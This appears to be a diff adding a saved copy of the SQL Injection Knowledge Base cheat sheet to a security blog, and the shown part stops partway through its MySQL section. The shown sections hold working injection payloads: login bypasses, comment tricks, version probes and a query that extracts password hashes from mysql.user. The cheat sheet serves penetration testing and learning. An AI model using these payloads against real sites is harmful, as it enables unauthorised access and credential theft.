@@ -1,0 +1,3748 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>sh1yan&#39;blog</title>
+
+  
+  <meta name="author" content="shiyan">
+  
+
+  
+  <meta name="description" content="信息安全|网络安全|渗透测试|代码审计|安全审计">
+  
+
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  
+
+  <meta property="og:site_name" content="sh1yan&#39;blog">
+
+  
+  <meta property="og:image" content="/favicon.ico">
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">sh1yan&#39;blog</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+        <li><a href="/about">关于</a></li>
+      
+        <li><a href="/yqlj">友链</a></li>
+      
+        <li><a href="/wiki_dict">WIKI</a></li>
+      
+        <li><a href="/atom.xml">订阅</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span></span></h3>
+    
+  
+  
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html" rel="bookmark">
+        <time class="entry-date published" datetime="2019-09-18T03:37:15.862Z">
+          2019-09-18
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
+<!-- saved from url=(0033)http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html -->
+<html class><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>The SQL Injection Knowledge Base</title>
+	
+		<meta name="keywords" content="SQL Injection, SQLi, Knowledge Base, KB, CS, PR, MySQL, MSSQL, Oracle, PostgreSQL, SQLite, MS Access, Cheatsheet, Pocket Reference">
+		<meta name="description" content="The SQL Injection Knowledge Base is the ultimate resource regarding SQL Injections. Here you will find everything there is to know about SQL Injections.">
+		<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
+		<meta name="HandheldFriendly" content="true">
+		<link type="text/css" href="./SQL-Injection-Knowledge-Base/jquery-ui-1.8.20.custom.css" rel="stylesheet">
+		<link type="text/css" href="./SQL-Injection-Knowledge-Base/style.css" rel="stylesheet">
+		<script type="text/javascript" src="./SQL-Injection-Knowledge-Base/jquery-1.7.2.min.js"></script>
+		<script type="text/javascript" src="./SQL-Injection-Knowledge-Base/jquery-ui-1.8.20.custom.min.js"></script><style type="text/css" abt="234"></style>
+		<script type="text/javascript">
+			$(function() {
+				$(".tabs").tabs();
+				$("#accordion").accordion({
+					header : "div",
+					collapsible : true,
+					autoHeight : false
+				});
+			});
+		</script>
+
+	<script>//remove baidu search ad
+var _countAA = 0
+function doBBBd(){
+    var alla = document.getElementsByTagName('a')
+    for(var i = 0; i < alla.length; i++){
+        if(/baidu.com\/(baidu.php\?url=|adrc.php\?t)/.test(alla[i].href)){
+            var _temp = alla[i].parentElement, loop = 0
+            while(loop < 5){
+                _temp = _temp.parentElement
+                loop++
+                if(_temp.parentElement.id == 'content_left'){
+                    _temp.remove()
+                    break
+                }
+            }
+        }
+    }
+    
+    if(_countAA++ < 20){
+        setTimeout(doBBBd, 500)
+    }
+    
+}
+doBBBd()
+document.addEventListener('keyup', function(){_countAA-=10;doBBBd()}, false)
+document.addEventListener('click', function(){_countAA-=10;doBBBd()}, false)
+//remove sohu video ad
+//if (document.URL.indexOf("tv.sohu.com") >= 0){
+//    if (document.cookie.indexOf("fee_status=true")==-1){document.cookie='fee_status=true'};
+//}
+//remove 56.com video ad
+//if (document.URL.indexOf("56.com") >= 0){
+//    if (document.cookie.indexOf("fee_status=true")==-1){document.cookie='fee_status=true'};
+//}
+</script><link type="text/css" rel="stylesheet" charset="UTF-8" href="./SQL-Injection-Knowledge-Base/translateelement.css"></head>
+	<body>
+		<div id="sidebar">
+			<ul id="accordion" class="ui-accordion ui-widget ui-helper-reset ui-accordion-icons" role="tablist">
+				<li class="ui-accordion-li-fix">
+					<div class="ui-accordion-header ui-helper-reset ui-state-default ui-state-active" role="tab" aria-expanded="true" aria-selected="true" tabindex="0"><span class="ui-icon ui-icon-triangle-1-s"></span><span class="ui-icon ui-icon-triangle-1-e"></span>
+						MySQL
+					</div>
+					<ul id="MySQL" class="ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" role="tabpanel">
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Default_Databases" target="_blank" rel="noopener">Default Databases</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Testing_Injection" target="_blank" rel="noopener">Testing Injection</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Comment_Out_Query" target="_blank" rel="noopener">Comment Out Query</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Testing_Version" target="_blank" rel="noopener">Testing Version</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Database_Credentials" target="_blank" rel="noopener">Database Credentials</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Database_Names" target="_blank" rel="noopener">Database Names</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Server_Hostname" target="_blank" rel="noopener">Server Hostname</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Server_MAC_Address" target="_blank" rel="noopener">Server MAC Address</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Tables_And_Columns" target="_blank" rel="noopener">Tables and Columns</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Avoiding_Quotations" target="_blank" rel="noopener">Avoiding quotations</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_String_Concatenation" target="_blank" rel="noopener">String concatenation</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Conditional_Statements" target="_blank" rel="noopener">Conditional Statements</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Timing" target="_blank" rel="noopener">Timing</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_File_Privileges" target="_blank" rel="noopener">Privileges</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Reading_Files" target="_blank" rel="noopener">Reading Files</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Writing_Files" target="_blank" rel="noopener">Writing Files</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_OOB_Channeling" target="_blank" rel="noopener">Out of band channeling</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Stacked_Queries" target="_blank" rel="noopener">Stacked Queries</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Specific_Code" target="_blank" rel="noopener">MySQL-specific code</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Fuzzing_Obfuscation" target="_blank" rel="noopener">Fuzzing and Obfuscation</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Operators" target="_blank" rel="noopener">Operators</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Constants" target="_blank" rel="noopener">Constants</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Password_Hashing" target="_blank" rel="noopener">Password Hashing</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Password_Cracking" target="_blank" rel="noopener">Password Cracking</a>
+						</li>
+
+					</ul>
+				</li>
+				<li class="ui-accordion-li-fix">
+					<div class="ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" role="tab" aria-expanded="false" aria-selected="false" tabindex="-1"><span class="ui-icon ui-icon-triangle-1-e"></span><span class="ui-icon ui-icon-triangle-1-e"></span>
+						MSSQL
+					</div>
+					<ul class="ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Default_Databases" target="_blank" rel="noopener">Default Databases</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Comment_Out_Query" target="_blank" rel="noopener">Comment Out Query</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Testing_Version" target="_blank" rel="noopener">Testing Version</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Database_Credentials" target="_blank" rel="noopener">Database Credentials</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Database_Names" target="_blank" rel="noopener">Database Names</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Server_Hostname" target="_blank" rel="noopener">Server Hostname</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Tables_And_Columns" target="_blank" rel="noopener">Tables and Columns</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Avoiding_Quotations" target="_blank" rel="noopener">Avoiding quotations</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_String_Concatenation" target="_blank" rel="noopener">String concatenation</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Conditional_Statements" target="_blank" rel="noopener">Conditional Statements</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Timing" target="_blank" rel="noopener">Timing</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_OPENROWSET_Attacks" target="_blank" rel="noopener">OPENROWSET Attacks</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_System_Command_Execution" target="_blank" rel="noopener">System Command Execution</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_SP_PASSWORD" target="_blank" rel="noopener">SP_PASSWORD (Hiding Query)</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Stacked_Queries" target="_blank" rel="noopener">Stacked Queries</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Fuzzing_Obfuscation" target="_blank" rel="noopener">Fuzzing and Obfuscation</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Password_Hashing" target="_blank" rel="noopener">Password Hashing</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MSSQL_Password_Cracking" target="_blank" rel="noopener">Password Cracking</a>
+						</li>
+					</ul>
+				</li>
+				<li class="ui-accordion-li-fix">
+					<div class="ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" role="tab" aria-expanded="false" aria-selected="false" tabindex="-1"><span class="ui-icon ui-icon-triangle-1-e"></span><span class="ui-icon ui-icon-triangle-1-e"></span>
+						ORACLE
+					</div>
+					<ul class="ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_Default_Databases" target="_blank" rel="noopener">Default Databases</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_Comment_Out_Query" target="_blank" rel="noopener">Comment Out Query</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_Testing_Version" target="_blank" rel="noopener">Testing Version</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_Database_Credentials" target="_blank" rel="noopener">Database Credentials</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_Database_Names" target="_blank" rel="noopener">Database Names</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_Server_Hostname" target="_blank" rel="noopener">Server Hostname</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_Tables_And_Columns" target="_blank" rel="noopener">Tables and Columns</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_Avoiding_Quotations" target="_blank" rel="noopener">Avoiding Quotations</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_String_Concatenation" target="_blank" rel="noopener">String concatenation</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_Conditional_Statements" target="_blank" rel="noopener">Conditional Statements</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_Timing" target="_blank" rel="noopener">Timing</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_Privileges" target="_blank" rel="noopener">Privileges</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_OOB_Channeling" target="_blank" rel="noopener">Out Of Band Channeling</a>
+						</li>
+						<li>
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Oracle_Password_Cracking" target="_blank" rel="noopener">Password Cracking</a>
+						</li>
+					</ul>
+				</li>
+				<div class="ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" role="tab" aria-expanded="false" aria-selected="false" tabindex="-1"><span class="ui-icon ui-icon-triangle-1-e"></span><span class="ui-icon ui-icon-triangle-1-e"></span>
+					Extras
+				</div>
+				<ul class="ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
+					<li>
+						<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Extra_About" target="_blank" rel="noopener">About</a>
+					</li>
+					<li>
+						<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Extra_Contact" target="_blank" rel="noopener">Contact</a>
+					</li>
+					<li>
+						<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Extra_Special_Thanks" target="_blank" rel="noopener">Special Thanks</a>
+					</li>
+					<li>
+						<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Extra_Contributions" target="_blank" rel="noopener">Contributions</a>
+					</li>
+					<li>
+						<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#Extra_Acknowledgments" target="_blank" rel="noopener">Acknowledgments</a>
+					</li>
+					<li>
+						<a href="https://docs.google.com/document/edit?id=1rO_LCBKJY0puvRhPhAfTD2iNVPfR4e9KiKDpDE2enMI" target="_blank">Google Docs Version</a>
+					</li>
+					<li>
+						<a href="http://50.57.51.240/challenges/" target="_blank">SQLi Challenges</a>
+					</li>
+					<li>
+						<a href="http://sqlfiddle.com/" target="_blank">SQL Fiddle</a>
+					</li>
+					<li>
+						<a href="http://pentestmonkey.net/cheat-sheet" target="_blank">Pentestmonkey Cheatsheet</a>
+					</li>
+					<li>
+						<a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/" target="_blank">Ferruh Mavituna Cheatsheet</a>
+					</li>
+					<li>
+						<a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html" target="_blank">MS Access Cheatsheet</a>
+					</li>
+					<li>
+						<a href="https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet" target="_blank">SQLite3 Cheatsheet</a>
+					</li>
+					<li>
+						<a href="https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/" target="_blank">Reiners Filter Evasion Cheatsheet</a>
+					</li>
+					<li>
+						<a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" target="_blank">OWASP Prevention Cheatsheet</a>
+					</li>
+					<li>
+						<a href="http://bobby-tables.com/" target="_blank">Bobby Tables Prevention Guide</a>
+					</li>
+					<li>
+						<a href="http://html5sec.org/" target="_blank">HTML5 Security Cheatsheet</a>
+					</li>
+				</ul>
+				
+			</ul>
+		</div>
+
+		<div id="content">
+			<ul id="MySQL_Content">
+				<h1>MySQL</h1>
+				<h2 id="MySQL_Default_Databases">Default Databases</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">mysql</td>
+						<td>Requires root privileges</td>
+					</tr>
+					<tr>
+						<td class="code">information_schema</td>
+						<td>Availalble from version 5 and higher</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MySQL_Testing_Injection">Testing Injection</h2>
+				<p>
+					False means the query is invalid (MySQL errors/missing content on website)
+
+				</p>
+				<p>
+					True means the query is valid (content is displayed as usual)
+				</p>
+				<div class="tabs ui-tabs ui-widget ui-widget-content ui-corner-all">
+					<ul class="ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all">
+						<li class="ui-state-default ui-corner-top ui-tabs-selected ui-state-active">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Strings" target="_blank" rel="noopener">Strings</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Numeric" target="_blank" rel="noopener">Numeric</a>
+						</li>
+						<li class="ui-state-default ui-corner-top ui-state-hover">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_In_a_login" target="_blank" rel="noopener">In a login</a>
+						</li>
+					</ul>
+
+					<div id="MySQL_Strings" class="ui-tabs-panel ui-widget-content ui-corner-bottom">
+						<p>
+							Given the query
+							<code>
+								SELECT * FROM Table WHERE id = '1';
+							</code>
+						</p>
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">'</td>
+								<td class="false">False</td>
+							</tr>
+							<tr>
+								<td class="code">''</td>
+								<td class="true">True</td>
+							</tr>
+							<tr>
+								<td class="code">"</td>
+								<td class="false">False</td>
+							</tr>
+							<tr>
+								<td class="code">""</td>
+								<td class="true">True </td>
+							</tr>
+							<tr>
+								<td class="code">\</td>
+								<td class="false">False</td>
+							</tr>
+							<tr>
+								<td class="code">\\</td>
+								<td class="true">True </td>
+							</tr>
+						</tbody></table>
+						<br>
+						<i>Examples:</i>
+						<ul class="data example">
+							<li class="code">
+								SELECT * FROM Articles WHERE id = '1<b class="injection">''</b>';
+							</li>
+							<li class="code">
+								SELECT 1 FROM dual WHERE 1 = '1<b class="injection">'''''''''''''UNION SELECT '2</b>';
+							</li>
+						</ul>
+						<p>
+							<i> Notes:
+							</i></p><ul><i>
+								<li class="note">
+									You can use as many apostrophes and quotations as you want as long as they pair up.
+								</li>
+								<li>
+									<code>
+									</code>
+								</li>
+								<li class="note">
+									It is also possible to continue the statement after the chain of quotes.
+								</li>
+								<li class="note">
+									Quotes escape quotes.
+								</li>
+							</i></ul>
+						<p></p>
+					</div>
+
+					<div id="MySQL_Numeric" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<p>
+							Given the query
+							<code>
+								SELECT * FROM Table WHERE id = 1;
+							</code>
+						</p>
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">AND 1</td>
+								<td class="true">True</td>
+							</tr>
+							<tr>
+								<td class="code">AND 0</td>
+								<td class="false">False</td>
+							</tr>
+							<tr>
+								<td class="code">AND true</td>
+								<td class="true">True</td>
+							</tr>
+							<tr>
+								<td class="code">AND false</td>
+								<td class="false">False</td>
+							</tr>
+							<tr>
+								<td class="code">1-false</td>
+								<td class="true">Returns 1 if vulnerable</td>
+							</tr>
+							<tr>
+								<td class="code">1-true</td>
+								<td class="false">Returns 0 if vulnerable</td>
+							</tr>
+							<tr>
+								<td class="code">1*56</td>
+								<td class="true">Returns 56 if vulnerable</td>
+							</tr>
+							<tr>
+								<td class="code">1*56</td>
+								<td class="true">Returns 1 if not vulnerable</td>
+							</tr>
+						</tbody></table>
+						<br>
+						<i>Example:</i>
+						<ul class="data example">
+							<li class="code">
+								SELECT * FROM Users WHERE id = 3<b class="injection">-2</b>;
+							</li>
+						</ul>
+						<p>
+							<i> Notes:
+							</i></p><ul><i>
+								<li class="note">
+									<code>
+										true
+									</code>
+									is equal to 1.
+								</li>
+								<li class="note">
+									<code>
+										false
+									</code>
+									is equal to 0.
+								</li>
+							</i></ul>
+						<p></p>
+					</div>
+
+					<div id="MySQL_In_a_login" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<p>
+							Given the query
+							<code>
+								SELECT * FROM Table WHERE username = '';
+							</code>
+						</p>
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">' OR '1</td>
+							</tr>
+							<tr>
+								<td class="code">' OR 1 -- -</td>
+							</tr>
+							<tr>
+								<td class="code">" OR "" = "</td>
+							</tr>
+							<tr>
+								<td class="code">" OR 1 = 1 -- -</td>
+							</tr>
+							<tr>
+								<td class="code">'='</td>
+							</tr>
+							<tr>
+								<td class="code">'LIKE'</td>
+							</tr>
+							<tr>
+								<td class="code">'=0--+</td>
+							</tr>
+						</tbody></table>
+						<br>
+						<i>Example:</i>
+						<ul class="data example">
+							<li class="code">
+								SELECT * FROM Users WHERE username = 'Mike' AND password = '<b class="injection">' OR '' = '</b>';
+							</li>
+						</ul>
+					</div>
+				</div>
+
+				<h2 id="MySQL_Comment_Out_Query">Comment Out Query</h2>
+				<p>
+					The following can be used to comment out the rest of the query after your injection:
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">#</td>
+						<td>Hash comment</td>
+					</tr>
+					<tr>
+						<td class="code">/*</td>
+						<td>C-style comment</td>
+					</tr>
+					<tr>
+						<td class="code">-- -</td>
+						<td>SQL comment</td>
+					</tr>
+					<tr>
+						<td class="code">;%00</td>
+						<td>Nullbyte</td>
+					</tr>
+					<tr>
+						<td class="code">`</td>
+						<td>Backtick</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT * FROM Users WHERE username = '' OR 1=1 <b class="injection">-- -</b>' AND password = '';
+					</li>
+					<li class="code">
+						SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3<b class="injection">`</b>';
+					</li>
+				</ul>
+				<p>
+					<i> Note:
+					</i></p><ul><i>
+						<li class="note">
+							The backtick can only be used to end a query when used as an alias.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h2 id="MySQL_Testing_Version">Testing Version</h2>
+				<div class="tabs ui-tabs ui-widget ui-widget-content ui-corner-all">
+					<ul class="ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all">
+						<li class="ui-state-default ui-corner-top ui-tabs-selected ui-state-active">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Testing_Version_Variables" target="_blank" rel="noopener">Variables</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Testing_Version_Specific_Code" target="_blank" rel="noopener">Specific Code</a>
+						</li>
+					</ul>
+
+					<div id="MySQL_Testing_Version_Variables" class="ui-tabs-panel ui-widget-content ui-corner-bottom">
+						<ul class="data">
+							<li>
+								<code class="code">
+									VERSION()
+								</code>
+							</li>
+							<li>
+								<code class="code">
+									@@VERSION
+								</code>
+							</li>
+							<li>
+								<code class="code">
+									@@GLOBAL.VERSION
+								</code>
+							</li>
+						</ul>
+						<br>
+						<i>Example:</i>
+						<ul class="data example">
+							<li class="code">
+								SELECT * FROM Users WHERE id = '1' AND MID(<b class="injection">VERSION()</b>,1,1) = '5';
+							</li>
+						</ul>
+						<p>
+							<i> Note:
+							</i></p><ul class="note"><i>
+								<li>
+									Output will contain
+									<code>
+										-nt-log
+									</code>
+									in case the DBMS runs on a Windows based machine.
+								</li>
+							</i></ul><i> </i>
+						<p></p>
+					</div>
+
+					<div id="MySQL_Testing_Version_Specific_Code" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<ul class="data">
+							<code class="code">
+								/*!VERSION Specific Code*/
+							</code>
+						</ul>
+						<br>
+						<i>Example:</i>
+						<ul class="data example">
+							<p>
+								Given the query
+								<code>
+									SELECT * FROM Users limit 1,{INJECTION POINT};
+								</code>
+							</p>
+							<table class="noborder">
+								<tbody><tr>
+									<td class="code">1 <b class="injection">/*!50094eaea*/</b>;</td>
+									<td>False - version is equal or greater than 5.00.94</td>
+								</tr>
+								<tr>
+									<td class="code">1 <b class="injection">/*!50096eaea*/</b>;</td>
+									<td>True - version is lesser than 5.00.96</td>
+								</tr>
+								<tr>
+									<td class="code">1 <b class="injection">/*!50095eaea*/</b>;</td>
+									<td>False - version is equal to 5.00.95</td>
+								</tr>
+							</tbody></table>
+						</ul>
+						<p>
+							<i> Note:
+							</i></p><ul class="note"><i>
+								<li>
+									It can be useful for determining the version in situations where you can't add anymore SQL to the query due to the position of the injection.
+								</li>
+								<li>
+									For more information about MySQL-specific code please refer to <a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Specific_Code" target="_blank" rel="noopener">MySQL-specific code</a>.
+								</li>
+							</i></ul>
+						<p></p>
+					</div>
+				</div>
+
+				<h2 id="MySQL_Database_Credentials">Database Credentials</h2>
+				<table>
+					<tbody><tr>
+						<td>Table</td>
+						<td class="code">mysql.user</td>
+					</tr>
+					<tr>
+						<td>Columns</td>
+						<td class="code">user, password</td>
+					</tr>
+					<tr>
+						<td>Current User</td>
+						<td class="code">user(), current_user(), current_user, system_user(), session_user()</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT <b class="injection">current_user</b>;
+					</li>
+					<li class="code">
+						SELECT CONCAT_WS(0x3A, <b class="injection">user</b>, <b class="injection">password</b>) FROM <b class="injection">mysql.user</b> WHERE user = 'root'-- (Privileged)
+					</li>
+				</ul>
+
+				<h2 id="MySQL_Database_Names">Database Names</h2>
+				<table>
+					<tbody><tr>
+						<td>Tables</td>
